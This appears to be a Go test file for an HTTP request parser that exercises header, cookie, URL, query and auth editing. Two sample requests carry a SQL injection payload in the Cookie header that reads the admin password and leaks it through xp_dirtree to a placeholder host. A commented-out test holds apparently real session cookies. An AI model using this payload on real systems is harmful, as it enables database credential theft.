package packet

import (
	"testing"
)

func TestParserPacket(t *testing.T) {
	s1 := `POST /execel.aspx HTTP/1.1
Host: www.qq.com
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ASP.NET_SessionId=rs3vw4vfynw25355415hjfir; starttime=2020/12/17 00:39:24' DECLARE @host varchar(1024) SELECT @host=(SELECT password from tbl_user where account='admin')+'§T1§' EXEC('master..xp_dirtree "\\'+@host+'\foobar$"') --
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


a=1&b=2&c3=3
`

	ok, pkt := ParserPacket(s1, true)
	//t.Log(ok, pkt)
	if ok {
		t.Log("--------数据包分析成功---------")
	} else {
		t.Log("--------数据包分析失败---------")
		return
	}
	t.Log(pkt.GetHostAndPort(), ">>>>>>>>>>", pkt.GetWebsite())
	t.Log("pkt.PathAndQuery:", pkt.GetPathAndQuery())
	//t.Log("pkt._OriginalPacket:\r\n"+ pkt._OriginalPacket)
	//t.Log("pkt._CurrentPayLoadPacket:\r\n"+ pkt._CurrentPayLoadPacket)

	t.Log("-------Socket IP和端口---------")
	t.Log("[显示要socket发送到的目标IP地址]")
	t.Log("pkt.DestIP:", pkt.GetDestIP())
	t.Log("[设置socket发送到的目标IP地址为空]")
	pkt.SetDestIP("")
	t.Log("pkt.DestIP:", pkt.GetDestIP())
	t.Log("[设置socket发送到的目标IP地址为xxx]")
	pkt.SetDestIP("xxx")
	t.Log("pkt.DestIP:", pkt.GetDestIP())
	t.Log("[设置socket发送到的目标IP端口]")
	t.Log("pkt.DestPort:", pkt.GetDestPort())
	t.Log("[设置socket发送到的目标IP端口为80]")
	pkt.SetDestPort(80)
	t.Log("pkt.DestPort:", pkt.GetDestPort())
	t.Log("[设置socket发送到的目标IP端口为8080]")
	pkt.SetDestPort(8080)
	t.Log("pkt.DestPort:", pkt.GetDestPort())
	t.Log("")

	t.Log("-------HTTP Scheme---------")
	t.Log("[打印原始HTTP Scheme:]")
	t.Log("pkt.Scheme:", pkt.Scheme)
	t.Log("[设置HTTP Scheme为HTTP:]")
	pkt.SetSSL(false)
	t.Log("pkt.Scheme:", pkt.Scheme)
	t.Log("[设置HTTP Scheme为HTTPS:]")
	pkt.SetSSL(true)
	t.Log("pkt.Scheme:", pkt.Scheme)
	t.Log("")

	t.Log("-------HTTP Method---------")
	t.Log("[打印原始HTTP Method:]")
	t.Log("pkt.Method:", pkt.GetMethod())
	t.Log("[设置Method为空字符串]")
	pkt.SetMethod("")
	t.Log("pkt.Method:", pkt.GetMethod())
	t.Log("[设置Method为xxx]")
	pkt.SetMethod("xxx")
	t.Log("pkt.Method:", pkt.GetMethod())
	t.Log("")

	t.Log("-------HTTP HttpVer---------")
	t.Log("[打印原始HTTP HttpVer:]")
	t.Log("pkt.HttpVer:", pkt.GetHttpVer())
	t.Log("[设置HTTP协议版本为空字符串]")
	pkt.SetHttpVer("")
	t.Log("pkt.HttpVer:", pkt.GetHttpVer())
	t.Log("[设置HTTP协议版本为HTTP/1.2]")
	pkt.SetHttpVer("HTTP/1.2")
	t.Log("pkt.HttpVer:", pkt.GetHttpVer())
	t.Log("")

	t.Log("-------HTTP UserAgent---------")
	t.Log("[打印原始HTTP UserAgent:]")
	t.Log("pkt.UserAgent:", pkt.GetUserAgent())
	t.Log("[设置UserAgent为空字符串]")
	pkt.SetUserAgent("")
	t.Log("pkt.UserAgent:", pkt.GetUserAgent())
	t.Log("[设置UserAgent为xxx]")
	pkt.SetUserAgent("xxx")
	t.Log("pkt.UserAgent:", pkt.GetUserAgent())
	t.Log("")

	t.Log("-------HTTP Headers---------")
	t.Log("[打印原始HTTP Header:]")
	t.Log("pkt.GetRawHeader:", pkt.GetRawHeader())
	t.Log("[设置Header newHeader: value1]")
	pkt.SetHeader("newHeader", "value1")
	t.Log("pkt.GetHeader newHeader:", pkt.GetHeader("newHeader"))
	t.Log("[添加Header newHeader: value2]")
	pkt.AddHeader("newHeader", "value2")
	t.Log("pkt.GetHeader newHeader:", pkt.GetHeader("newHeader"))
	t.Log("[添加Header newHeader3: value3]")
	pkt.AddHeader("newHeader3", "value3")
	t.Log("pkt.GetHeader newHeader3:", pkt.GetHeader("newHeader3"))
	t.Log("[添加Header newHeader4: ]")
	pkt.AddHeader("newHeader4", "")
	t.Log("pkt.GetHeader newHeader4:", pkt.GetHeader("newHeader4"))
	t.Log("pkt.GetRawHeader:", pkt.GetRawHeader())
	t.Log(`[DelHeader("newHeader3")`)
	pkt.DelHeader("newHeader3")
	t.Log("pkt.GetHeader newHeader3:", pkt.GetHeader("newHeader3"))
	pkt.SetHeader("Content-Type", "application/x-www-form-urlencoded")
	t.Log("pkt.GetHeader Content-Type:", pkt.GetHeader("Content-Type"))
	t.Log("pkt.GetRawHeader:", pkt.GetRawHeader())
	t.Log("[添加重复的DupHeader]")
	pkt.AddDupHeader("Cookie", "DupCookie")
	t.Log("pkt.GetDupHeader:", pkt.GetDupHeader("Cookie"))
	t.Log("")

	t.Log("-------HTTP Cookie---------")
	t.Log("[打印原始HTTP Cookie:]")
	t.Log("pkt.GetRawCookie:", pkt.GetRawCookie())
	t.Log("[设置Cookie c1: v1]")
	pkt.SetCookie("c1", "v1")
	t.Log("pkt.GetCookie c1:", pkt.GetCookie("c1"))
	t.Log("[添加Cookie c1: v2]")
	pkt.AddCookie("c1", "v2")
	t.Log("pkt.GetCookie c1:", pkt.GetCookie("c1"))
	t.Log("[添加Cookie c3: v3]")
	pkt.AddCookie("c3", "v3")
	t.Log("pkt.GetCookie c3:", pkt.GetCookie("c3"))
	t.Log("[添加Cookie c4: ]")
	pkt.AddCookie("c4", "")
	t.Log("pkt.GetCookie c4:", pkt.GetCookie("c4"))
	t.Log("pkt.GetRawCookie:", pkt.GetRawCookie())
	t.Log(`[DelCookie("c3")`)
	pkt.DelCookie("c3")
	t.Log("pkt.GetCookie c3:", pkt.GetCookie("c3"))
	t.Log("pkt.GetRawCookie:", pkt.GetRawCookie())
	t.Log("")

	t.Log("-------HTTP GetPostData---------")
	t.Log("[打印原始HTTP GetPostData:]")
	t.Log("pkt.GetPostData:", pkt.GetPostData())
	t.Log("[设置PostData为空]")
	pkt.SetPostData("")
	t.Log("pkt.GetPostData:", pkt.GetPostData())
	t.Log("[打印以上修改后的数据包:]")
	t.Log("pkt.Packet:", pkt.GetPacket())
	t.Log("[设置PostData xxxxx=yyyyy]")
	pkt.SetPostData("xxxxx=yyyyy")
	t.Log("pkt.GetPostData:", pkt.GetPostData())
	t.Log("")

	t.Log("-------HTTP URL---------")
	t.Log("pkt.GetURL:", pkt.GetURL())
	t.Log("pkt.GetPath:", pkt.GetPath())
	t.Log("pkt.GetRawQuery:", pkt.GetRawQuery())
	t.Log("pkt.GetPathAndQuery:", pkt.GetPathAndQuery())
	t.Log("pkt.GetQuery q:", pkt.GetQuery("x"))
	t.Log("pkt.GetQuery pp:", pkt.GetQuery("pp"))

	t.Log("[设置URL为http://111.123.1.49:8071/]")
	pkt.SetURL("http://111.123.1.49:8071/")
	t.Log("pkt.GetURL:", pkt.GetURL())
	t.Log("[设置URL的值为：searchResult?q=118.107.42.97&pp=2#1234fgqg你好]")
	pkt.SetURL("searchResult?q=118.107.42.97&pp=2#1234fgqg你好")
	t.Log("pkt.GetHost:", pkt.GetHost())
	t.Log("pkt.GetPort:", pkt.GetPort())
	t.Log("pkt.GetHostAndPort:", pkt.GetHostAndPort())
	t.Log("pkt.GetPath:", pkt.GetPath())
	t.Log("pkt.GetRawQuery:", pkt.GetRawQuery())
	t.Log("pkt.GetPathAndQuery:", pkt.GetPathAndQuery())
	t.Log("pkt.GetURL:", pkt.GetURL())
	t.Log("[打印以上修改后的数据包:]")
	t.Log("pkt.Packet:", pkt.GetPacket())
	t.Log("[设置URL为https://www.zoomeye.org:999/searchResult?q=111.107.42.97&pp=2#1234fgqg你好]")
	pkt.SetURL("https://www.zoomeye.org:999/searchResult?q=111.107.42.97&pp=2#1234fgqg你好")
	t.Log("pkt.GetURL:", pkt.GetURL())
	t.Log("pkt.GetHost:", pkt.GetHost())
	t.Log("pkt.GetPort:", pkt.GetPort())
	t.Log("pkt.GetHostAndPort:", pkt.GetHostAndPort())
	t.Log("pkt.GetPath:", pkt.GetPath())
	t.Log("pkt.GetRawQuery:", pkt.GetRawQuery())
	t.Log("pkt.GetPathAndQuery:", pkt.GetPathAndQuery())
	t.Log("pkt.GetQuery q:", pkt.GetQuery("q"))
	t.Log("pkt.GetQuery pp:", pkt.GetQuery("pp"))
	t.Log("[打印以上修改后的数据包:]")
	t.Log("pkt.Packet:", pkt.GetPacket())
	t.Log("")

	t.Log("-------HTTP Host And Port---------")
	t.Log("pkt.GetURL:", pkt.GetURL())
	t.Log("[设置Host为www.qq.com]")
	pkt.SetHost("www.qq.com")
	t.Log("[设置Port为443]")
	pkt.SetPort(443)
	t.Log("pkt.GetURL:", pkt.GetURL())
	t.Log("pkt.GetHost:", pkt.GetHost())
	t.Log("pkt.GetPort:", pkt.GetPort())
	t.Log("pkt.GetHostAndPort:", pkt.GetHostAndPort())
	t.Log("")

	t.Log("-------HTTP Path---------")
	t.Log("pkt.GetPath:", pkt.GetPath())
	t.Log("[设置Path为空]")
	pkt.SetPath("")
	t.Log("pkt.GetPath:", pkt.GetPath())
	t.Log("pkt.GetPathAndQuery:", pkt.GetPathAndQuery())
	t.Log("pkt.GetURL:", pkt.GetURL())
	t.Log("[设置Path为/admin/login/login.php]")
	pkt.SetPath("/admin/login/login.php")
	t.Log("pkt.GetPath:", pkt.GetPath())
	t.Log("pkt.GetPathAndQuery:", pkt.GetPathAndQuery())
	t.Log("pkt.GetURL:", pkt.GetURL())
	t.Log("")

	t.Log("-------HTTP Query---------")
	t.Log("pkt.GetQuery x:", pkt.GetQuery("x"))
	t.Log("[设置Query的x参数的参数值为空]")
	pkt.SetQuery("x", "")
	t.Log("pkt.GetQuery x:", pkt.GetQuery("x"))
	t.Log("[设置Query的x参数的参数值为123]")
	pkt.SetQuery("x", "123")
	t.Log("pkt.GetQuery x:", pkt.GetQuery("x"))
	t.Log("[又添加Query的x参数的参数值为456]")
	pkt.AddQuery("x", "456")
	t.Log("pkt.GetQuery x:", pkt.GetQuery("x"))
	t.Log("pkt.GetRawQuery:", pkt.GetRawQuery())
	t.Log("[添加Query的y参数的参数值为yyyy]")
	pkt.AddQuery("y", "yyyy")
	t.Log("pkt.GetURL:", pkt.GetURL())
	t.Log("[删除Query的y参数的参数值为yyyy]")
	pkt.DelQuery("y")
	t.Log("pkt.GetRawQuery:", pkt.GetRawQuery())
	t.Log("pkt.GetURL:", pkt.GetURL())
	t.Log("[设置RawQuery为:ips=103.77.192.231&submore=123456]")
	pkt.SetRawQuery(`ips=103.77.192.231&submore=123456`)
	t.Log("")

	t.Log("-------HTTP Fragment---------")
	t.Log("pkt.GetFragment x:", pkt.GetFragment())
	t.Log("[设置Fragment为空]")
	pkt.SetFragment("")
	t.Log("pkt.GetFragment:", pkt.GetFragment())
	t.Log("[设置Fragment为Fragment]")
	pkt.SetFragment("Fragment")
	t.Log("pkt.GetFragment:", pkt.GetFragment())
	t.Log("")

	pkt.SetAuthUser("admin")
	pkt.SetAuthPwd("123456")

	t.Log("[打印以上修改后的数据包:]")
	t.Log("pkt.Packet:", pkt.GetPacket())

	//t.Log("[将数据包转换成GET格式:]")
	////pkt.ToGetFormat()
	//t.Log("pkt.Packet:", pkt.GetPacket())
	//
	//t.Log("[将数据包转换成POST格式:]")
	////pkt.ToPostFormat()
	//t.Log("pkt.Packet:", pkt.GetPacket())
	//
	//t.Log("[将数据包转换成Mutilpart格式:]")
	//pkt.SetMethod("POST")
	//pkt.ToMutilpartFormat()
	//t.Log("pkt.Packet:", pkt.GetPacket())

}

// func TestURL2Packet(t *testing.T) {
// 	u := "https://git.nosugar.io:65535/golang/TangGo/front_end/http_tester/-/issues/15?id=1^^^multipart^^^a=1&b=2&c=3&d=4"
// 	x, err := URL2Packet(u)
// 	u = `https://www.baidu.com/s`
// 	x, err = URL2Packet(u)
// 	if err != nil {
// 		return
// 	}
// 	y, _ := MutilpartToPOST(x.Packet)
// 	z, _ := PostToMutilpart(y)
// 	//t.Log(z)

// 	u = `GET https://www.baidu.com/s?ie=utf-8&csq=1&pstg=22&mod=2&isbd=1&cqid=ed539b9d0001c36b&istc=652&ver=QAtqHwpVQb4aje7a5KXWnu9Z20Z8WymPEYm&chk=5fc0cc2b&isid=8C16B842B0811861&wd=11111111111&rsv_spt=1&rsv_iqid=0xf17afa0400018491&issp=1&f=8&rsv_bp=1&rsv_idx=2&ie=utf-8&tn=baiduhome_pg&rsv_enter=1&rsv_dl=ib&rsv_sug3=11&rsv_sug1=2&rsv_sug7=100&_ck=1287.0.-1.-1.-1.-1.-1&rsv_isid=1448_33058_31660_33098_33101_32845_26350&isctg=5&rsv_stat=-2&rsv_sug7=100 HTTP/1.1
// Host: www.baidu.com
// Connection: keep-alive
// Accept: */*
// is_xhr: 1
// X-Requested-With: XMLHttpRequest
// is_referer: https://www.baidu.com/
// User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
// Sec-Fetch-Site: same-origin
// Sec-Fetch-Mode: cors
// Sec-Fetch-Dest: empty
// Referer: https://www.baidu.com/s?wd=11111111111&rsv_spt=1&rsv_iqid=0xf17afa0400018491&issp=1&f=8&rsv_bp=1&rsv_idx=2&ie=utf-8&tn=baiduhome_pg&rsv_enter=1&rsv_dl=ib&rsv_sug3=11&rsv_sug1=2&rsv_sug7=100
// Accept-Encoding: gzip, deflate, br
// Accept-Language: zh-CN,zh;q=0.9
// Cookie: BIDUPSID=C17F21CA36C46F49F5E2813BAECD38BF; PSTM=1599621593; BAIDUID=8C16B88E6AEBF7CA5314457918042B08:FG=1; BD_UPN=12314753; BDUSS=U1b2VNSDJCcTAyflBPV3lJWTlzdnAtN3IzTVd-NXJGaFY1Ti1INnFtLUNsWnBmRVFBQUFBJCQAAAAAAAAAAAEAAADCqTUzsNfUxs~CtcTMvs-iAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIIIc1-CCHNfan; BDUSS_BFESS=U1b2VNSDJCcTAyflBPV3lJWTlzdnAtN3IzTVd-NXJGaFY1Ti1INnFtLUNsWnBmRVFBQUFBJCQAAAAAAAAAAAEAAADCqTUzsNfUxs~CtcTMvs-iAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIIIc1-CCHNfan; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; MCITY=-75%3A; BDRCVFR[feWj1Vr5u3D]=I67x6TjHwwYf0; delPer=0; BD_CK_SAM=1; BD_HOME=1; BAIDUID_BFESS=8C16B88E6AEBF7CA5314457918042B08:FG=1; H_PS_PSSID=1448_33058_31660_33098_33101_32845_26350; ZD_ENTRY=baidu; COOKIE_SESSION=78688_0_9_9_39_17_1_0_9_6_11_6_78690_0_4_0_1606457459_0_1606457455%7C9%2320996_12_1599646820%7C3; PSINO=7; H_PS_645EC=11147aEiU3qVxGCcvML1DEG253zt7akylO8KhuetFUmd4TkdHlCnk6vO7ErVsTGG2kZ6; BA_HECTOR=2la00ga104840galfk1fs1j1b0q; WWW_ST=1606470699124

// `
// 	i, _ := GetToPostNormalFormatPacket(u)
// 	k, _ := GetToPostMutilpartFormatPacket(u)
// 	j, _ := PostToGetFormatPacket(i)
// 	l, _ := PostToGetFormatPacket(k)

// 	t.Log(j, l)
// }

func TestBuild(t *testing.T) {
	req := `POST /execel.aspx HTTP/1.1\nHost: 66.42.33.172:8888\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: ASP.NET_SessionId=rs3vw4vfynw25355415hjfir; starttime=2020/12/17 00:39:24' DECLARE @host varchar(1024) SELECT @host=(SELECT password from tbl_user where account='admin')+'§T1§' EXEC('master..xp_dirtree \"\\\\'+@host+'\\foobar$\"') --\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\r\n\r\n`
	ok, packet := ParserPacket(req, false)
	t.Log(ok)
	t.Log(packet.GetFullHeader())
}
